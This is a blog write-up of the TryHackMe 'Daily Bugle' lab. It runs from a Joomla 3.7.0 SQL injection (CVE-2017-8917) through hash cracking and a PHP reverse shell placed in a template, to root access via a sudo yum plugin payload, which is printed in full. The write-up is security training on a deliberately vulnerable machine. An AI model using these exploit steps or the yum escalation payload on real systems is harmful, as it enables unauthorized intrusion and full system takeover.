---
layout: post
title: "Daily Bugle"
date: 2022-04-01
categories: [Tryhackme, Hard-THM]
tags: [joomla, sqli, yum, sqlmap]
image: ../../assets/img/posts/DailyBugle.png 

---

## Description

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

|**Room**|[Daily Bugle](https://tryhackme.com/room/dailybugle)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Hard|
|**Creator**|[tryhackme](https://tryhackme.com/p/tryhackme)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.66.234 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/161198809-9b402234-daba-4491-a483-37a134564ecb.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p22,80,3306 10.10.66.234 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/161198818-24dd3bd6-42a3-466a-bc41-9436ee06e69e.png)

Result scan shows that port 22 is running ssh service, port 80 is running apache webserver. Let's start enumerating port 80 first.

Visit http://10.10.66.234,

![image](https://user-images.githubusercontent.com/67465230/161198825-ece094db-e4e5-4dbe-82f4-4c30989e3b00.png)

I landed on webpage where Spider-Man is robbing the bank (lmao) and this webpage also has a login page (interesting!).

Since I checked all the entry points already, it was dead-end. So I decided to fuzz hidden directories using gobuster,

```bash
gobuster dir -u http://10.10.66.234 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q 2>/dev/null -o gobuster2.log
```

![image](https://user-images.githubusercontent.com/67465230/161198837-3a4341db-2b65-42d7-98cd-22c4ca8fdc3d.png)

Gobuster shows that there are many directories which we can work upon but I am more interested in Administrator directory. So I decided to navigate to that.

Visit http://10.10.66.234/Administrator,

![image](https://user-images.githubusercontent.com/67465230/161198849-a23d9848-da11-407f-bc8f-244879a8f727.png)

we got another login page but this time, it's running Joomla software. 

I tried to bypass this login mechanism using SQL injection and searched for possible exploits on the interweb but was unsuccessful.

Then I fired up the metasploit-framework using `msfconsole -q` and then I search for any joomla scanner,

```bash
search scanner joomla
```

![image](https://user-images.githubusercontent.com/67465230/161198855-f65b383c-b8f9-4d1d-8609-d8bf9833109b.png)

I was lucky that there are modules for joomla. 

So at first, I decided to gather information on Joomla version,

```bash
use auxiliary/scanner/http/joomla_version
```

![image](https://user-images.githubusercontent.com/67465230/161198859-a3b0e4cd-adcc-4c02-a8a2-cd3a6298903e.png)

setting the `options`:
- **set rhosts 10.10.66.234**

Firing up the exploit and we got the version of the joomla running on the system which is **3.7.0**,

![image](https://user-images.githubusercontent.com/67465230/161198872-299d0b71-1b21-4159-bdff-dfea420b974f.png)

Now since I knew what version of Joomla is running, I searched for possible exploits on interwebs, [joomla 3.7.0 python exploit](https://github.com/stefanlucas/Exploit-Joomla),

![image](https://user-images.githubusercontent.com/67465230/161198881-ee3cd729-d308-4d9b-ba03-d4dac76f10c3.png)

>**CVE-2017-8917** : SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute arbitrary SQL commands via unspecified vectors.

Now, let's use this exploit on our target,

```bash
python joomblah.py http://10.10.66.234
```

![image](https://user-images.githubusercontent.com/67465230/161198889-aa09144a-ede7-45fd-b41c-a2d28e4a71af.png)

after firing this exploit, we got the hash of **jonah** user. 

Checking what type of hash it is using **nth** (Name-That-Hash) tool,

```bash
nth --text '$2y$10$0veO/****************.******.*********.*.************'
```

![image](https://user-images.githubusercontent.com/67465230/161198898-e2ab513b-68b0-4eab-bd43-cb3890bb3d4b.png)

Seems like this is Blowfish (mode 3200) hash.

I used hashcat to crack this hash,

```bash
hashcat.exe -a 0 -m 3200 crack.txt rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/161198905-b90bb108-0deb-4ea5-af75-a947f9c2f669.png)

we can also crack this hash using JTR,

```bash
john crack.txt wordlist=rockyou.txt --format=bcrypt
```

Now since we have jonah user credential, we can access the panel of website,

![image](https://user-images.githubusercontent.com/67465230/161198913-89a989b1-62e3-4ff1-9bf3-827ba1792eae.png)

Navigating around the website and I found that in **index.php** file in **Protostar template**, we can edit this file (like putting the php-reverse-shell code in it and save the file). 

So I started a listener using `nc -nvlp 4444` and triggered the shell by visiting http://10.10.68.234/index.php,

![image](https://user-images.githubusercontent.com/67465230/161198922-7a75117b-61ae-422b-9d0e-30b88296025c.png)

We got the connection after triggering the shell,

![image](https://user-images.githubusercontent.com/67465230/161198929-78d19591-62d5-4cdb-89d1-5ea8637c92b6.png)

But the shell I got was so unstable that when pressing ctrl-c for killing the process, it ultimately kills off the shell. 

So I tried to improve upon this shell,

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

but this command didn't work and this made me wonder that if this is not working, then do I have to solve this whole box with this unstable shell only :(. No.

Fortunately, I tried the same command but with python this time and it works,

![image](https://user-images.githubusercontent.com/67465230/161198934-e8ae1a08-0802-4f77-8144-e8b0fb4b0dca.png)

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
stty rows 38 columns 116
```

Now that our shell is improved, we can automate the enumeration with linpeas script,

![image](https://user-images.githubusercontent.com/67465230/161198943-05b60baf-ed4b-4b2e-9010-3e45b409834d.png)

after scrolling down the result, I found the password which I can use to switch to **jjameson** user. *I literally wasted half an hour on a wrong password I found.*

>REMEMBER TO LOOK AT EVERYTHING IN LINPEAS. Don’t skip to the bottom.

So let's switch to another user,

```bash
su jjameson
id
```

![image](https://user-images.githubusercontent.com/67465230/161199016-02cb86d4-d091-4f6c-ae38-4293ead9bcfe.png)

we're now jjameson user.

Let's list all the files we can run using sudo command,

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/161199025-a6783d86-bfe7-4ada-be23-c6388ff08e6a.png)

we can run /usr/bin/yum binary as sudo.

I checked [yum](https://gtfobins.github.io/gtfobins/yum/#sudo) on gtfobins and got the method to escalate our privileges to root user,

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
```

![image](https://user-images.githubusercontent.com/67465230/161199036-272bd03d-ddfa-453d-86f7-d828056a39b4.png)

After executing last command, we got the system access,

```bash
sudo yum -c $TF/x --enableplugin=y
```

![[Pasted image 20211112022557.png]]
